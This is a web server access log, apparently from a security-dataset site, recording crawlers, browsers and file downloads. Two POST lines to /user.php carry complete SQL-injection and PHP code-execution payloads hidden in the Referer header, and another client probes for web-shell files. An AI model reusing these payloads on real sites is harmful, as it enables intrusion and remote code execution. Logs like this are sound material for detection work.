54.36.150.180 - - [10/Mar/2019:03:16:00 -0700] "GET /self.logs/error.log.2016-08-04.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
52.212.146.96 - - [10/Mar/2019:19:30:03 -0700] "GET /self.logs/access.log.2019-03-08.gz HTTP/1.1" 404 340 "-" "python-requests/2.12.1" 
52.212.146.96 - - [10/Mar/2019:19:30:03 -0700] "GET /self.logs/access.log.2019-03-09.gz HTTP/1.1" 404 340 "-" "python-requests/2.12.1" 
52.212.146.96 - - [10/Mar/2019:19:30:03 -0700] "GET /self.logs/access.log.2019-03-10.gz HTTP/1.1" 404 340 "-" "python-requests/2.12.1" 
45.76.69.3 - - [10/Mar/2019:19:32:44 -0700] "GET / HTTP/1.0" 301 461 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
45.76.69.3 - - [10/Mar/2019:19:32:44 -0700] "GET / HTTP/1.0" 200 46413 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
54.36.148.37 - - [10/Mar/2019:19:33:13 -0700] "GET /self.logs/2015/access.log.2015-12-18.gz HTTP/1.1" 200 4135 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
59.64.129.186 - - [10/Mar/2019:19:35:36 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
59.64.129.186 - - [10/Mar/2019:19:35:37 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
59.64.129.186 - - [10/Mar/2019:19:35:37 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
59.64.129.186 - - [10/Mar/2019:19:35:38 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
5.255.250.94 - - [10/Mar/2019:19:37:48 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.90.103 - - [10/Mar/2019:19:37:48 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
37.9.87.180 - - [10/Mar/2019:19:37:49 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
5.255.250.94 - - [10/Mar/2019:19:37:52 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.90.103 - - [10/Mar/2019:19:37:52 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
106.120.173.148 - - [10/Mar/2019:19:39:06 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
54.36.148.201 - - [10/Mar/2019:19:43:32 -0700] "GET /self.logs/ HTTP/1.1" 200 15236 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
95.163.199.120 - - [10/Mar/2019:19:43:33 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 23085976 "https://blog.csdn.net/answer3lin/article/details/82966360" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
128.1.163.194 - - [10/Mar/2019:19:47:33 -0700] "POST /user.php HTTP/1.1" 404 295 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:201:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24687a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262614870736247466e595630704f773d3d2729293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
128.1.163.194 - - [10/Mar/2019:19:47:33 -0700] "POST /user.php HTTP/1.1" 404 239 "45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:\"num\";s:207:\"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b24487a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262534870736247466e595630704f773d3d2729293b2f2f7d7d,0--\";s:2:\"id\";s:9:\"' union/*\";s:4:\"name\";s:3:\"ads\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
54.36.148.84 - - [10/Mar/2019:19:52:38 -0700] "GET /self.logs/2015/access.log.2015-05-04.gz HTTP/1.1" 200 3809 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
106.120.173.148 - - [10/Mar/2019:19:53:32 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930799 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
199.58.86.206 - - [10/Mar/2019:19:53:36 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [10/Mar/2019:19:53:37 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [10/Mar/2019:19:53:39 -0700] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [10/Mar/2019:19:53:40 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [10/Mar/2019:19:53:46 -0700] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
70.42.131.189 - - [10/Mar/2019:19:55:05 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)" 
70.42.131.189 - - [10/Mar/2019:19:55:05 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)" 
70.42.131.189 - - [10/Mar/2019:19:55:06 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)" 
70.42.131.189 - - [10/Mar/2019:19:55:06 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)" 
54.36.148.191 - - [10/Mar/2019:19:55:54 -0700] "GET /self.logs/2015/access.log.2015-03-21.gz HTTP/1.1" 200 2878 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
211.83.110.183 - - [10/Mar/2019:20:07:03 -0700] "GET / HTTP/1.1" 200 12470 "https://www.baidu.com/link?url=pViVANwhXrQt7gJnoH4bztKw3ohxIO35xFPzcHKRVLGktyEt_s3ruf-cHu857aDF&wd=&eqid=823373120004efe6000000035c85d0d3" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" 
211.83.110.183 - - [10/Mar/2019:20:07:04 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" 
211.83.110.183 - - [10/Mar/2019:20:07:04 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" 
123.125.67.226 - - [10/Mar/2019:20:07:58 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.219 - - [10/Mar/2019:20:08:00 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.67.224 - - [10/Mar/2019:20:08:02 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
73.172.237.145 - - [10/Mar/2019:20:08:14 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6629420 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
211.83.110.183 - - [10/Mar/2019:20:08:28 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" 
54.36.150.122 - - [10/Mar/2019:20:08:36 -0700] "GET /self.logs/2016/error.log.2016-03-22.gz HTTP/1.1" 200 651 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
123.125.71.91 - - [10/Mar/2019:20:10:05 -0700] "GET / HTTP/1.1" 200 12433 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
54.36.148.230 - - [10/Mar/2019:20:12:17 -0700] "GET /self.logs/access.log.2016-02-09.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
173.89.34.198 - - [10/Mar/2019:20:21:48 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
173.89.34.198 - - [10/Mar/2019:20:21:48 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
173.89.34.198 - - [10/Mar/2019:20:21:48 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
173.89.34.198 - - [10/Mar/2019:20:21:51 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
13.66.139.0 - - [10/Mar/2019:20:29:49 -0700] "GET /self.logs/error.log.2017-02-20.gz HTTP/1.1" 200 1014 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [10/Mar/2019:20:31:36 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
59.64.129.186 - - [10/Mar/2019:20:32:58 -0700] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 200 1437 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
59.64.129.186 - - [10/Mar/2019:20:32:58 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/Datasets%20Description/Network/dns.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
175.13.97.88 - - [10/Mar/2019:20:37:52 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
175.13.97.88 - - [10/Mar/2019:20:37:53 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
175.13.97.88 - - [10/Mar/2019:20:37:53 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
66.102.6.238 - - [10/Mar/2019:20:38:04 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.102.6.234 - - [10/Mar/2019:20:38:04 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
40.77.167.38 - - [10/Mar/2019:20:47:37 -0700] "GET /self.logs/access.log.2015-07-31.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
97.113.206.241 - - [10/Mar/2019:20:49:19 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" 
97.113.206.241 - - [10/Mar/2019:20:49:19 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" 
97.113.206.241 - - [10/Mar/2019:20:49:19 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" 
186.211.105.202 - - [10/Mar/2019:20:57:05 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.1 Safari/605.1.15" 
42.236.102.3 - - [10/Mar/2019:21:05:39 -0700] "GET / HTTP/1.1" 200 12470 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.12.190 - - [10/Mar/2019:21:05:58 -0700] "GET / HTTP/1.1" 301 483 "http://secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.12.190 - - [10/Mar/2019:21:05:59 -0700] "GET / HTTP/1.1" 200 12470 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
54.36.150.152 - - [10/Mar/2019:21:07:16 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/weird.html HTTP/1.1" 200 1775 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
42.236.101.194 - - [10/Mar/2019:21:07:26 -0700] "GET / HTTP/1.1" 200 12470 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.99.58 - - [10/Mar/2019:21:07:36 -0700] "GET / HTTP/1.1" 301 483 "http://secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.99.58 - - [10/Mar/2019:21:07:37 -0700] "GET / HTTP/1.1" 200 12470 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.54.42 - - [10/Mar/2019:21:08:46 -0700] "GET / HTTP/1.1" 200 12470 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.99.79 - - [10/Mar/2019:21:09:22 -0700] "GET / HTTP/1.1" 301 483 "http://secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.99.79 - - [10/Mar/2019:21:09:23 -0700] "GET / HTTP/1.1" 200 12470 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.99.58 - - [10/Mar/2019:21:17:28 -0700] "GET / HTTP/1.1" 200 12470 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
114.115.254.113 - - [10/Mar/2019:21:23:06 -0700] "GET / HTTP/1.1" 200 46424 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.115.254.113 - - [10/Mar/2019:21:23:07 -0700] "POST //d.php HTTP/1.1" 404 294 "http://www.secrepo.com//d.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.115.254.113 - - [10/Mar/2019:21:23:07 -0700] "POST //x.php HTTP/1.1" 404 294 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.115.254.113 - - [10/Mar/2019:21:23:07 -0700] "POST /robots1.php HTTP/1.1" 404 294 "http://www.secrepo.com/robots1.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
66.249.66.88 - - [10/Mar/2019:21:25:49 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.89 - - [10/Mar/2019:21:25:55 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Googlebot-Image/1.0" 
165.225.116.218 - - [10/Mar/2019:21:27:29 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
165.225.116.218 - - [10/Mar/2019:21:27:30 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
165.225.116.218 - - [10/Mar/2019:21:27:30 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
165.225.116.218 - - [10/Mar/2019:21:27:32 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
54.36.148.137 - - [10/Mar/2019:21:31:14 -0700] "GET /self.logs/2015/access.log.2015-08-23.gz HTTP/1.1" 200 4903 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
41.223.160.131 - - [10/Mar/2019:21:31:17 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
175.13.97.88 - - [10/Mar/2019:21:31:51 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
175.13.97.88 - - [10/Mar/2019:21:31:52 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
113.171.224.176 - - [10/Mar/2019:21:38:04 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
219.250.109.236 - - [10/Mar/2019:21:39:44 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Whale/1.4.64.3 Safari/537.36" 
219.250.109.236 - - [10/Mar/2019:21:39:44 -0700] "GET / HTTP/1.1" 200 12469 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Whale/1.4.64.3 Safari/537.36" 
42.236.99.65 - - [10/Mar/2019:21:49:42 -0700] "GET /robots.txt HTTP/1.1" 200 334 "http://www.secrepo.com/robots.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.99.65 - - [10/Mar/2019:21:49:42 -0700] "GET /robots.txt HTTP/1.1" 301 502 "http://secrepo.com/robots.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.99.65 - - [10/Mar/2019:21:49:43 -0700] "GET /robots.txt HTTP/1.1" 200 333 "http://www.secrepo.com/robots.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
54.36.150.111 - - [10/Mar/2019:21:50:12 -0700] "GET /self.logs/access.log.2015-04-23.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
202.120.121.113 - - [10/Mar/2019:21:57:39 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
202.120.121.113 - - [10/Mar/2019:21:57:40 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
202.120.121.113 - - [10/Mar/2019:21:57:40 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
202.120.121.113 - - [10/Mar/2019:21:57:40 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
202.120.121.113 - - [10/Mar/2019:21:57:44 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
51.158.79.176 - - [10/Mar/2019:22:00:30 -0700] "GET /robots.txt HTTP/1.1" 301 481 "-" "TagVisit/0.1 (+http://tag-visit.com/GCgJLAIYGhZUBFMaQkpLNQ/bot)" 
51.158.79.176 - - [10/Mar/2019:22:00:30 -0700] "GET /robots.txt HTTP/1.1" 200 252 "http://secrepo.com/robots.txt" "TagVisit/0.1 (+http://tag-visit.com/GCgJLAIYGhZUBFMaQkpLNQ/bot)" 
51.158.79.176 - - [10/Mar/2019:22:00:30 -0700] "GET / HTTP/1.1" 301 461 "http://tag-visit.com/Hi8LAS8eV3BdWAYeekNAfw" "TagVisit/0.1 (+http://tag-visit.com/GCgJLAIYGhZUBFMaQkpLNQ/bot)" 
51.158.79.176 - - [10/Mar/2019:22:00:31 -0700] "GET / HTTP/1.1" 200 46413 "http://secrepo.com/" "TagVisit/0.1 (+http://tag-visit.com/GCgJLAIYGhZUBFMaQkpLNQ/bot)" 
